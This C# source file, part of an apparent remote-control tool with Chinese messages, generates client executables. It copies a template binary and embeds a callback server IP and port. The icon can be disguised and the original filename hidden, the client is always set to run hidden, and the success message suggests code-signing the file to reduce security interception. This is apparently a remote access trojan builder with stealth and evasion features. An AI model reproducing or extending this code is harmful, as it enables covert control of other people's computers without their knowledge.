using System;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Server.Utils;

namespace RemoteControl.Server
{
    public partial class FrmSettings
    {
        private bool settingsLoaded;

        public void GenerateClient()
        {
            EnsureSettingsLoaded();

            string serverIP = this.textBoxServerIP.Text.Trim();
            int serverPortNum;
            if (!int.TryParse(this.textBoxServerPort.Text.Trim(), out serverPortNum))
            {
                MsgBox.Info("服务器端口无效！");
                return;
            }
            if (string.IsNullOrWhiteSpace(this.textBoxServiceName.Text))
            {
                MsgBox.Info("服务名称不能为空！");
                return;
            }

            string serviceName = this.textBoxServiceName.Text.Trim();
            string avatar = this.pictureBoxAvatar.Tag == null ? string.Empty : this.pictureBoxAvatar.Tag.ToString();
            bool showOriginalFilename = this.checkBoxShowOriginalFileName.Checked;
            if (!SaveSettingsFromForm(true))
                return;

            string datFilePath = System.IO.Path.Combine(
                AppDomain.CurrentDomain.BaseDirectory,
                "RemoteControl.Client.dat");
            if (!System.IO.File.Exists(datFilePath))
            {
                MsgBox.Info("RemoteControl.Client.dat文件丢失！");
                return;
            }

            using (SaveFileDialog dialog = new SaveFileDialog())
            {
                dialog.Filter = "可执行程序(*.exe)|*.exe|所有文件(*.*)|*.*";
                dialog.FilterIndex = 1;
                dialog.RestoreDirectory = true;
                dialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (dialog.ShowDialog() != DialogResult.OK)
                    return;

                ClientParameters para = new ClientParameters();
                try
                {
                    para.SetServerIP(serverIP);
                }
                catch (Exception ex)
                {
                    MsgBox.Info("服务器IP无效：" + ex.Message);
                    return;
                }
                para.ServerPort = serverPortNum;
                para.ServiceName = serviceName;
                para.OnlineAvatar = avatar;

                byte[] fileBytes = System.IO.File.ReadAllBytes(datFilePath);
                System.IO.File.WriteAllBytes(dialog.FileName, fileBytes);
                if (this.checkBoxAppIcon.Checked &&
                    this.pictureBoxAppIcon.Tag != null &&
                    System.IO.File.Exists(this.pictureBoxAppIcon.Tag.ToString()))
                {
                    IconChanger.ChangeIcon(dialog.FileName, this.pictureBoxAppIcon.Tag as string);
                }

                fileBytes = System.IO.File.ReadAllBytes(dialog.FileName);
                ClientParametersManager.WriteClientStyle(fileBytes, ClientParametersManager.ClientStyle.Hidden);
                if (!showOriginalFilename)
                    ClientParametersManager.HideOriginalFilename(fileBytes);
                ClientParametersManager.WriteParameters(fileBytes, dialog.FileName, para);

                MsgBox.Info("客户端生成成功！\n" + dialog.FileName + "\n\n如需减少系统拦截，请使用可信代码签名证书对该文件签名。");
            }
        }

        private void EnsureSettingsLoaded()
        {
            if (!settingsLoaded)
                FrmSettings_Load(this, EventArgs.Empty);
        }

        private bool SaveSettingsFromForm(bool showMessage)
        {
            int cServerPort;
            if (!int.TryParse(this.textBoxServerPort.Text.Trim(), out cServerPort))
                return ShowSettingError(showMessage, "客户端端口无效！");
            int sServerPort;
            if (!int.TryParse(this.textBoxLocalServerPort.Text.Trim(), out sServerPort))
                return ShowSettingError(showMessage, "服务端端口无效！");
            if (string.IsNullOrWhiteSpace(this.textBoxServiceName.Text))
                return ShowSettingError(showMessage, "服务名称不能为空！");

            if (Settings.CurrentSettings.ClientPara == null)
                Settings.CurrentSettings.ClientPara = new ClientParas();
            string avatar = this.pictureBoxAvatar.Tag == null ? string.Empty : this.pictureBoxAvatar.Tag.ToString();
            Settings.CurrentSettings.ClientPara.ServerIP = this.textBoxServerIP.Text.Trim();
            Settings.CurrentSettings.ClientPara.ServerPort = cServerPort;
            Settings.CurrentSettings.ClientPara.ServiceName = this.textBoxServiceName.Text.Trim();
            Settings.CurrentSettings.ClientPara.OnlineAvatar = avatar;
            Settings.CurrentSettings.ClientPara.IsHide = this.checkBoxHideClient.Checked;
            Settings.CurrentSettings.ClientPara.ClientIconPath =
                this.checkBoxAppIcon.Checked && this.pictureBoxAppIcon.Tag != null
                    ? this.pictureBoxAppIcon.Tag.ToString()
                    : null;
            Settings.CurrentSettings.ServerPort = sServerPort;
            Settings.CurrentSettings.RelayServerIP = this.textBoxRelayIP.Text.Trim();
            int relayPort;
            if (int.TryParse(this.textBoxRelayPort.Text.Trim(), out relayPort))
                Settings.CurrentSettings.RelayServerPort = relayPort;
            Settings.SaveSettings();
            return true;
        }

        private bool ShowSettingError(bool showMessage, string message)
        {
            if (showMessage)
                MsgBox.Info(message);
            return false;
        }
    }
}
